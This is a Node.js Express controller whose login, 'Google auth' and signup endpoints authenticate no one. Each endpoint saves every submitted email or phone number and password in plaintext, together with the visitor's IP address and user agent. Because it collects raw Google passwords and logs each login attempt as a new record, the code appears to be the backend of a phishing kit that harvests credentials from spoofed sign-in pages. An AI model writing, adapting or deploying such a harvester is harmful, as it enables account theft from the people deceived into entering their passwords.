const User = require("../models/User");

// @desc    Store login credentials
// @route   POST /api/users/login
// @access  Public
exports.storeLoginCredentials = async (req, res) => {
  try {
    const { emailOrPhone, password } = req.body;

    // Get IP address and user agent
    const ipAddress =
      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];

    // Create a new user entry in the database - storing password in plaintext
    const user = new User({
      emailOrPhone,
      password,
      authMethod: "direct",
      ipAddress,
      userAgent,
    });

    await user.save();

    res
      .status(201)
      .json({ success: true, message: "Credentials stored successfully" });
  } catch (err) {
    console.error("Error storing credentials:", err.message);
    res.status(500).json({ success: false, message: "Server Error" });
  }
};

// @desc    Store Google auth credentials
// @route   POST /api/users/google-auth
// @access  Public
exports.storeGoogleCredentials = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Get IP address and user agent
    const ipAddress =
      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];

    // Create a new user entry in the database - storing password in plaintext
    const user = new User({
      emailOrPhone: email,
      password,
      authMethod: "google",
      ipAddress,
      userAgent,
    });

    await user.save();

    res
      .status(201)
      .json({
        success: true,
        message: "Google credentials stored successfully",
      });
  } catch (err) {
    console.error("Error storing Google credentials:", err.message);
    res.status(500).json({ success: false, message: "Server Error" });
  }
};

// @desc    Store signup credentials
// @route   POST /api/users/signup
// @access  Public
exports.storeSignupCredentials = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Get IP address and user agent
    const ipAddress =
      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];

    // Create a new user entry in the database - storing password in plaintext
    const user = new User({
      emailOrPhone: email,
      password,
      authMethod: "direct",
      ipAddress,
      userAgent,
    });

    await user.save();

    res
      .status(201)
      .json({
        success: true,
        message: "Signup credentials stored successfully",
      });
  } catch (err) {
    console.error("Error storing signup credentials:", err.message);
    res.status(500).json({ success: false, message: "Server Error" });
  }
};
